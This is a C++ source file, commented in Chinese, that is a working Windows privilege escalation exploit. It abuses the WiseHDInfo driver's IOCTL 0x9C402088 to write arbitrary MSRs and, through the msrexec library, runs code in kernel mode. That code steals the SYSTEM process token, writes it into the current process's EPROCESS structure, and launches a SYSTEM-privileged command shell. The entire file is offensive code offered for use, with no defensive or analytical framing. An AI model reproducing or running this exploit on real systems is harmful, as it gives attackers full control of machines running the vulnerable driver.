#include "msrexec.hpp"
#include <iostream>

using ExAllocatePool_t = void* (*)(std::uint32_t, std::size_t);
using PsLookupProcessByProcessId_t = NTSTATUS (*)(HANDLE, PVOID*);

int __cdecl main(int argc, char** argv)
{
    // 1. 實作任意使用 wrmsr 的函數
    writemsr_t _write_msr = [&](std::uint32_t reg, std::uintptr_t value) -> bool
    {
        struct DATA_9C402088
        {
            unsigned long Register;
            unsigned long Value_low;
            unsigned long Value_high;
        };

        // 取得 Device Handle
        HANDLE hDevice =
            CreateFile(L"\\\\.\\WiseHDInfo", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

        // 設定 InputBuffer 後觸發 wrmsr 漏洞
        DWORD dwWrite;
        DATA_9C402088 data;
        data.Register = reg;
        data.Value_low = value & 0xffffffff;
        data.Value_high = (value >> 32) & 0xffffffff;
        DeviceIoControl(hDevice, 0x9C402088, &data, sizeof(data), NULL, 0, &dwWrite, NULL);

        return true;
    };
    vdm::msrexec_ctx msrexec(_write_msr);

    // 2. 實作要在 Kernel 執行的任意程式
    DWORD pid = GetCurrentProcessId();
    msrexec.exec(
        [pid](void* krnl_base, get_system_routine_t get_kroutine) -> void
        {
            // 因為是在程式是放在應用層，所以無法直接呼叫 Kernel API，要先從 ntoskrnl.exe 找到需要的函數位址
            const auto ExAllocatePool = reinterpret_cast<ExAllocatePool_t>(get_kroutine(krnl_base, "ExAllocatePool"));
            const auto PsLookupProcessByProcessId =
                reinterpret_cast<PsLookupProcessByProcessId_t>(get_kroutine(krnl_base, "PsLookupProcessByProcessId"));

            // 把當前 Process 的 EPROCESS Token 竄改為 System 的 EPROCESS Token
            PVOID* ppEprocess = (PVOID*)ExAllocatePool(NULL, 0x8);
            PsLookupProcessByProcessId((HANDLE)4, ppEprocess);
            DWORD64 systemToken = *(DWORD64*)(*(DWORD64*)ppEprocess + 0x358) & 0xfffffffffffffff0;
            PsLookupProcessByProcessId((HANDLE)pid, ppEprocess);
            *(DWORD64*)(*(DWORD64*)ppEprocess + 0x358) = systemToken;
        });

    // 3. 彈出有 system 權限的 cmd
    system("cmd");
}
